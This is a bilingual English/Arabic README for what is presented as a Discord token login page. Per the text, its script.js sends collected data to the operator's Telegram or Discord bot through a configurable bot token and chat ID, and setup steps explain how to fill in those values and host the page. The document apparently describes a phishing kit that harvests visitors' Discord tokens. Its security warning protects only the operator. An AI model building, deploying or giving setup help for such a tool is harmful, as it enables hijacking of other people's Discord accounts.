Discord Token Login Script / سكربت تسجيل الدخول عبر توكن الديسكورد
🌍 Language / اللغة
English

العربية

English
📝 Project Description
This project is a simple web-based Discord Login Page that allows users to log in using their Discord Token. Additionally, it integrates a Telegram/Discord bot notification system via script.js to log or track activities using a Bot Token and Chat ID.

🚀 How to Setup
To get this project working on your local machine or GitHub Pages, follow these steps:

Clone the repository or download the files.

Open the script.js file.

Locate the configuration variables at the top of the file:

JavaScript
const config = {
    BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
    CHAT_ID: "YOUR_CHAT_ID_HERE"
};
Replace "YOUR_BOT_TOKEN_HERE" with your actual Bot Token.

Replace "YOUR_CHAT_ID_HERE" with your actual Chat ID.

Save the file and run index.html.

⚠️ Security Warning: Never share your real BOT_TOKEN publicly on GitHub. Use environment variables if you plan to deploy it publicly.

العربية
📝 وصف المشروع
هذا المشروع عبارة عن صفحة تسجيل دخول بسيطة للديسكورد (Discord Login Page) تتيح تسجيل الدخول عبر "التوكن" (Token). يحتوي المشروع على ملف script.js مدمج بنظام إشعارات يربط السكرت بالبوت الخاص بك لإرسال البيانات عبر توكن البوت وآيدي الشات.

🚀 طريقة الإعداد والتشغيل
لكي يعمل هذا السكربت بشكل صحيح على جهازك أو عند رفعه على GitHub، اتبع الخطوات التالية:

تحميل الملفات أو عمل Clone للمستودع.

افتح ملف script.js.

ابحث عن متغيرات الإعداد (Configuration) في أعلى الملف:

JavaScript
const config = {
    BOT_TOKEN: "التوكن الخاص بالبوت هنا",
    CHAT_ID: "الأيدي الخاص بك هنا"
};
استبدل "التوكن الخاص بالبوت هنا" بالتوكن الحقيقي للبوت الخاص بك (BOT_TOKEN).

استبدل "الأيدي الخاص بك هنا" بالآيدي الحقيقي الخاص بك (CHAT_ID).

احفظ الملف وقم بتشغيل ملف الـ index.html.

⚠️ تحذير أمني: لا تقم بنشر التوكن الحقيقي (BOT_TOKEN) بشكل علني على قيت هاب لتجنب سرقة البوت الخاص بك.

🛠️ Technologies Used / التقنيات المستخدمة
HTML5 / CSS3

JavaScript (Vanilla JS)
